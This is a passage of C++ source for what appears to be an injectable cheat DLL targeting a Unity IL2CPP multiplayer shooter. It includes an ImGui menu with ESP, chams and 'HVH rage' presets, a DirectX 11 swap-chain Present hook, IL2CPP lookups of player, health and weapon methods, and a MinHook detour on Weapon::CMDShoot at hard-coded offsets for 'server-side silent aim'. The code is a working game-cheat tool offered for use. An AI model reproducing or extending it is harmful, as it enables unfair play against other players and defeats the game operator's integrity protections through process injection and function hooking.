                        ImGui::ColorEdit4("Chams Team (Visible)",  colChamsTeamVis, miniEditFlags);
                        ImGui::Spacing();
                        ImGui::ColorEdit4("Chams Team (Occluded)", colChamsTeamOcc, miniEditFlags);

                        ImGui::Spacing();
                        ImGui::Separator();
                        ImGui::Spacing();

                        if (ImGui::Button("RESET ALL COLORS TO FACTORY DEFAULT", ImVec2(-1, 38))) {
                            colEnemy[0] = 1.0f; colEnemy[1] = 0.22f; colEnemy[2] = 0.35f; colEnemy[3] = 1.0f;
                            colTeam[0]  = 0.20f; colTeam[1] = 0.70f; colTeam[2] = 1.00f; colTeam[3] = 1.0f;
                            colSkeleton[0] = 0.95f; colSkeleton[1] = 0.95f; colSkeleton[2] = 0.98f; colSkeleton[3] = 0.90f;
                            colTracers[0]  = 1.0f; colTracers[1] = 0.85f; colTracers[2] = 0.20f; colTracers[3] = 0.80f;
                            colHeadCircle[0]=1.0f; colHeadCircle[1]=0.35f; colHeadCircle[2]=0.50f; colHeadCircle[3]=1.0f;
                            colChamsEnemyVis[0]=1.0f; colChamsEnemyVis[1]=0.20f; colChamsEnemyVis[2]=0.40f; colChamsEnemyVis[3]=0.75f;
                            colChamsEnemyOcc[0]=0.85f; colChamsEnemyOcc[1]=0.10f; colChamsEnemyOcc[2]=0.90f; colChamsEnemyOcc[3]=0.55f;
                            colChamsTeamVis[0]=0.20f; colChamsTeamVis[1]=0.70f; colChamsTeamVis[2]=1.00f; colChamsTeamVis[3]=0.75f;
                            colChamsTeamOcc[0]=0.10f; colChamsTeamOcc[1]=0.40f; colChamsTeamOcc[2]=0.80f; colChamsTeamOcc[3]=0.50f;
                        }
                    }
                    ImGui::EndChild();
                }

                // ═════════════════════════════════════════════════════════════
                // TAB 5: LIVE LOG CAPTURER & ENGINE DIAGNOSTICS
                // ═════════════════════════════════════════════════════════════
                else if (iTopNavTab == 5) {
                    float halfWidth = (ImGui::GetContentRegionAvail().x - 12.0f) * 0.5f;

                    // ── CARD 1: Live Game Engine & Unity Debug Log Viewer ──
                    ImGui::BeginChild("CardGameLogs", ImVec2(halfWidth, 0), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Live Game Engine Logs (Intercepted)");
                        ImGui::Separator();
                        ImGui::Spacing();

                        {
                            std::lock_guard<std::mutex> lock(g_GameLogMutex);
                            ImGui::Text("Total Intercepted Logs: %d", (int)g_GameLogs.size());
                        }

                        ImGui::SameLine(ImGui::GetWindowWidth() - 150.0f);
                        if (ImGui::Button("Clear Logs", ImVec2(130, 24))) {
                            std::lock_guard<std::mutex> lock(g_GameLogMutex);
                            g_GameLogs.clear();
                        }

                        ImGui::Spacing();

                        // Scrollable log terminal window
                        ImGui::BeginChild("LogTerminal", ImVec2(0, 0), true, ImGuiWindowFlags_HorizontalScrollbar);
                        {
                            std::lock_guard<std::mutex> lock(g_GameLogMutex);
                            if (g_GameLogs.empty()) {
                                ImGui::TextDisabled("Waiting for game engine log events / Unity exceptions...");
                            } else {
                                for (const auto& entry : g_GameLogs) {
                                    ImVec4 col(0.85f, 0.88f, 0.95f, 1.0f);
                                    const char* tag = "[LOG]";
                                    if (entry.type == 0 || entry.type == 4) { // Error / Exception
                                        col = ImVec4(1.0f, 0.35f, 0.35f, 1.0f);
                                        tag = (entry.type == 4) ? "[EXCEPTION]" : "[ERROR]";
                                    } else if (entry.type == 2) { // Warning
                                        col = ImVec4(1.0f, 0.85f, 0.30f, 1.0f);
                                        tag = "[WARNING]";
                                    } else if (entry.type == 1) { // Assert
                                        col = ImVec4(1.0f, 0.60f, 0.20f, 1.0f);
                                        tag = "[ASSERT]";
                                    }

                                    ImGui::TextColored(ImVec4(0.5f, 0.5f, 0.6f, 1.0f), "[%s]", entry.timeStr.c_str());
                                    ImGui::SameLine();
                                    ImGui::TextColored(col, "%s %s", tag, entry.message.c_str());
                                }

                                if (ImGui::GetScrollY() >= ImGui::GetScrollMaxY()) {
                                    ImGui::SetScrollHereY(1.0f);
                                }
                            }
                        }
                        ImGui::EndChild();
                    }
                    ImGui::EndChild();

                    ImGui::SameLine();

                    // ── CARD 2: Engine Telemetry & Config Profiles ──
                    ImGui::BeginChild("CardDiagnostics", ImVec2(halfWidth, 0), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Engine Telemetry & Profiles");
                        ImGui::Separator();
                        ImGui::Spacing();

                        bool il2cppOk  = (g_Il2Cpp.hGameAssembly != nullptr);
                        bool classesOk = (g_PlayerClass != nullptr);

                        ImGui::Text("DirectX 11 Overlay : ");
                        ImGui::SameLine();
                        ImGui::TextColored(ImVec4(0.35f, 0.65f, 1.00f, 1.0f), "HOOKED (Active)");

                        ImGui::Text("IL2CPP Engine API  : ");
                        ImGui::SameLine();
                        ImGui::TextColored(il2cppOk ? ImVec4(0.20f, 0.85f, 0.40f, 1.0f) : ImVec4(1.0f, 0.3f, 0.3f, 1.0f),
                                           il2cppOk ? "INITIALIZED (OK)" : "FAILED");

                        ImGui::Text("Player Ragdoll Class: ");
                        ImGui::SameLine();
                        ImGui::TextColored(classesOk ? ImVec4(0.20f, 0.85f, 0.40f, 1.0f) : ImVec4(1.0f, 0.6f, 0.2f, 1.0f),
                                           classesOk ? "BOUND (Assembly-CSharp)" : "Waiting for match spawn...");

                        ImGui::Spacing();
                        ImGui::Text("Live Tracked Entities : %d", (int)g_ESPData.size());
                        ImGui::Text("Framerate / Performance: %.1f FPS (%.2f ms/frame)", io.Framerate, 1000.0f / io.Framerate);
                        ImGui::Text("Viewport Resolution    : %.0f x %.0f", io.DisplaySize.x, io.DisplaySize.y);

                        ImGui::Spacing();
                        ImGui::Separator();
                        ImGui::Spacing();

                        if (g_ConfigStatus[0] != '\0' && (GetTickCount64() - g_ConfigStatusTime < 6000)) {
                            ImGui::TextColored(ImVec4(0.35f, 0.65f, 1.00f, 1.0f), "%s", g_ConfigStatus);
                            ImGui::Spacing();
                        }

                        if (ImGui::Button("SAVE CONFIG TO DISK", ImVec2(-1, 38))) SaveConfig();
                        ImGui::Spacing();
                        if (ImGui::Button("LOAD CONFIG FROM DISK", ImVec2(-1, 38))) LoadConfig();
                        ImGui::Spacing();
                        if (ImGui::Button("LOAD HVH RAGE PRESET", ImVec2(-1, 38))) LoadHvHConfig();
                        ImGui::Spacing();
                        if (ImGui::Button("RESET TO DEFAULTS", ImVec2(-1, 34))) ResetConfigToDefaults();

                        ImGui::Spacing();
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::TextColored(ImVec4(0.35f, 0.65f, 1.00f, 1.0f), "Diagnostic Log Files:");
                        ImGui::BulletText("Game Engine Log : XUYBYA_GameEngine.log");
                        ImGui::BulletText("Cheat Engine Log: XUYBYA_Cheat.log");
                        ImGui::BulletText("Crash Telemetry : XUYBYA_Crash.log");
                    }
                    ImGui::EndChild();
                }
            }
            ImGui::EndChild();

            ImGui::End();
        }

        ImGui::Render();
        g_pd3dDeviceContext->OMSetRenderTargets(1, &g_mainRenderTargetView, NULL);
        ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());
    }

    return oPresent(pSwapChain, SyncInterval, Flags);
}

// ─── Find SwapChain VTable using dummy HWND ──────────────────────────────────
DWORD_PTR* GetSwapChainVTable() {
    HWND hWndDummy = CreateWindowA("BUTTON", "DummyD3D", WS_OVERLAPPED, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
    if (!hWndDummy) return nullptr;

    DXGI_SWAP_CHAIN_DESC sd = {};
    sd.BufferCount        = 1;
    sd.BufferDesc.Format  = DXGI_FORMAT_R8G8B8A8_UNORM;
    sd.BufferDesc.Width   = 100;
    sd.BufferDesc.Height  = 100;
    sd.BufferUsage        = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    sd.OutputWindow       = hWndDummy;
    sd.SampleDesc.Count   = 1;
    sd.Windowed           = TRUE;
    sd.SwapEffect         = DXGI_SWAP_EFFECT_DISCARD;

    const D3D_FEATURE_LEVEL levels[] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0 };
    D3D_FEATURE_LEVEL       level;
    IDXGISwapChain*         sc  = nullptr;
    ID3D11Device*           dev = nullptr;
    ID3D11DeviceContext*    ctx = nullptr;

    DWORD_PTR* vtable = nullptr;

    if (SUCCEEDED(D3D11CreateDeviceAndSwapChain(NULL, D3D_DRIVER_TYPE_HARDWARE,
        NULL, 0, levels, 2, D3D11_SDK_VERSION, &sd, &sc, &dev, &level, &ctx))) {
        
        vtable = *(DWORD_PTR**)sc;

        sc->Release();
        dev->Release();
        ctx->Release();
    }

    DestroyWindow(hWndDummy);
    return vtable;
}

// ─── Initializer Worker Thread ───────────────────────────────────────────────
DWORD WINAPI InitThread(LPVOID lpParam) {
    g_hDllModule = (HMODULE)lpParam;

    // Register Crash & Exception Telemetry Handler
    AddVectoredExceptionHandler(1, CrashHandler);

    CheatLog("========================================================");
    CheatLog("★ XUYBYA Cheat Logger Initialized");
    CheatLog("Target Process PID : %lu", GetCurrentProcessId());
    CheatLog("Cheat Module Base  : 0x%p", g_hDllModule);
    CheatLog("========================================================");

    CheatLog("[*] Waiting for DirectX runtime modules (dxgi.dll, d3d11.dll)...");
    while (!GetModuleHandleA("dxgi.dll") || !GetModuleHandleA("d3d11.dll")) {
        Sleep(200);
    }
    CheatLog("[+] DirectX modules acquired.");
    Sleep(500);

    CheatLog("[*] Waiting for GameAssembly.dll...");
    while (!GetModuleHandleA("GameAssembly.dll")) {
        Sleep(300);
    }
    CheatLog("[+] GameAssembly.dll detected at base 0x%p", GetModuleHandleA("GameAssembly.dll"));
    Sleep(500);

    CheatLog("[*] Initializing IL2CPP domain and metadata resolver...");
    if (g_Il2Cpp.Init()) {
        Il2CppImage* asmCS = g_Il2Cpp.GetImage("Assembly-CSharp");
        if (asmCS) {
            g_PlayerClass         = g_Il2Cpp.il2cpp_class_from_name(asmCS, "", "Player");
            g_PlayerMovementClass = g_Il2Cpp.il2cpp_class_from_name(asmCS, "", "PlayerMovement");
            g_HealthClass         = g_Il2Cpp.il2cpp_class_from_name(asmCS, "", "Health");
            g_SharedRefClass      = g_Il2Cpp.il2cpp_class_from_name(asmCS, "", "SharedReferences");
            g_RagdollCamClass     = g_Il2Cpp.il2cpp_class_from_name(asmCS, "", "RagdollCameraController");
            g_WeaponClass         = g_Il2Cpp.il2cpp_class_from_name(asmCS, "", "Weapon");
            g_WeaponManagerClass  = g_Il2Cpp.il2cpp_class_from_name(asmCS, "", "WeaponManager");
            g_DataPackerClass     = g_Il2Cpp.il2cpp_class_from_name(asmCS, "", "DataPacker");

            CheatLog("[+] Classes resolved: Player=%p, PM=%p, Health=%p, SharedRef=%p, RagdollCam=%p, Weapon=%p, DataPacker=%p",
                     g_PlayerClass, g_PlayerMovementClass, g_HealthClass, g_SharedRefClass, g_RagdollCamClass, g_WeaponClass, g_DataPackerClass);

            if (g_HealthClass) {
                g_GetCurrentHealth       = g_Il2Cpp.FindMethod(g_HealthClass, "GetCurrentHealth", 0);
                g_IsDeadMethod           = g_Il2Cpp.FindMethod(g_HealthClass, "IsDead", 0);
                g_CMDChangeCurrentHealth = g_Il2Cpp.FindMethod(g_HealthClass, "CMDChangeCurrentHealth", 1);
                CheatLog("[+] Health Methods: GetHp=%p, IsDead=%p, CMDChangeHp=%p", g_GetCurrentHealth, g_IsDeadMethod, g_CMDChangeCurrentHealth);
            }
            if (g_WeaponClass) {
                g_ClientTryShoot         = g_Il2Cpp.FindMethod(g_WeaponClass, "ClientTryShoot", 0);
                g_CMDShoot               = g_Il2Cpp.FindMethod(g_WeaponClass, "CMDShoot", 3);
                CheatLog("[+] Weapon Methods: ClientTryShoot=%p, CMDShoot=%p", g_ClientTryShoot, g_CMDShoot);
            }
            if (g_WeaponManagerClass) {
                g_PickUpMethod           = g_Il2Cpp.FindMethod(g_WeaponManagerClass, "PickUp", 1);
                g_StartPickUpMethod      = g_Il2Cpp.FindMethod(g_WeaponManagerClass, "StartPickUp", 1);
                CheatLog("[+] WeaponManager Methods: PickUp=%p, StartPickUp=%p", g_PickUpMethod, g_StartPickUpMethod);
            }
            if (g_DataPackerClass) {
                g_PackDirectionMethod    = g_Il2Cpp.FindMethod(g_DataPackerClass, "PackDirection", 1);
                g_UnpackShortMethod      = g_Il2Cpp.FindMethod(g_DataPackerClass, "UnpackShort", 1);
                g_PackVector3Method      = g_Il2Cpp.FindMethod(g_DataPackerClass, "PackVector3", 1);
                g_UnpackDirectionMethod  = g_Il2Cpp.FindMethod(g_DataPackerClass, "UnpackDirection", 1);
                CheatLog("[+] DataPacker Methods: PackDir=%p, UnpackShort=%p, PackV3=%p, UnpackDir=%p",
                         g_PackDirectionMethod, g_UnpackShortMethod, g_PackVector3Method, g_UnpackDirectionMethod);
            }
        }
    } else {
        CheatLog("[-] IL2CPP initialization failed!");
    }

    CheatLog("[*] Hooking DirectX 11 SwapChain VTable...");
    DWORD_PTR* vtable = GetSwapChainVTable();
    if (vtable) {
        MH_Initialize();
        MH_CreateHook((void*)vtable[8],  (LPVOID)&hkPresent,       (void**)&oPresent);
        MH_CreateHook((void*)vtable[13], (LPVOID)&hkResizeBuffers, (void**)&oResizeBuffers);

        // Hook Weapon::CMDShoot for 100% Server-Side Silent Aim
        void* cmdShootTarget = nullptr;
        if (g_CMDShoot) {
            cmdShootTarget = *(void**)g_CMDShoot;
        }
        if (!cmdShootTarget && g_Il2Cpp.hGameAssembly) {
            cmdShootTarget = (void*)((char*)g_Il2Cpp.hGameAssembly + 0x4BD500);
        }
        if (cmdShootTarget) {
            MH_CreateHook(cmdShootTarget, (LPVOID)&hkCMDShoot, (void**)&oCMDShoot);
            CheatLog("[+] Weapon::CMDShoot hooked at 0x%p", cmdShootTarget);
        }

        // Hook Unity Game Engine Debug Log and Exception Handler
        if (g_Il2Cpp.hGameAssembly) {
            void* pInternalLog = (void*)((char*)g_Il2Cpp.hGameAssembly + 0x297b3a0);
            void* pInternalLogException = (void*)((char*)g_Il2Cpp.hGameAssembly + 0x297b530);

            MH_CreateHook(pInternalLog, (LPVOID)&hkInternal_Log, (void**)&oInternal_Log);
            MH_CreateHook(pInternalLogException, (LPVOID)&hkInternal_LogException, (void**)&oInternal_LogException);
            CheatLog("[+] Unity Game Engine Log Interceptors hooked at 0x%p, 0x%p", pInternalLog, pInternalLogException);
        }

        MH_EnableHook(MH_ALL_HOOKS);
        CheatLog("[+] All MinHook detours enabled successfully.");
    } else {
        CheatLog("[-] Failed to retrieve SwapChain VTable!");
    }

    CheatLog("=== Initialization complete. Cheat is active! ===");
    return 0;
}

// ─── DllMain ─────────────────────────────────────────────────────────────────
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID /*lpReserved*/) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        g_hDllModule = hModule;
        DisableThreadLibraryCalls(hModule);
        CreateThread(nullptr, 0, InitThread, (LPVOID)hModule, 0, nullptr);
    }
    return TRUE;
}
